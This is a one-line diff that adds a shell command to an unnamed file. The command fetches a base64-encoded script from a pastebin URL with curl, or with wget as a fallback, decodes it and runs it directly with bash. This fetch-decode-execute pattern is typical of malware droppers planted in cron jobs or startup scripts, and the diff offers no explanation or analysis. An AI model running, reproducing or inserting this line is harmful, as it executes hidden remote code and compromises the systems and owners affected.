@@ -1,0 +1,1 @@
+(curl -fsSL https://pastebin.com/raw/Gw7mywhC || wget -q -O- https://pastebin.com/raw/Gw7mywhC)|base64 -d |/bin/bash
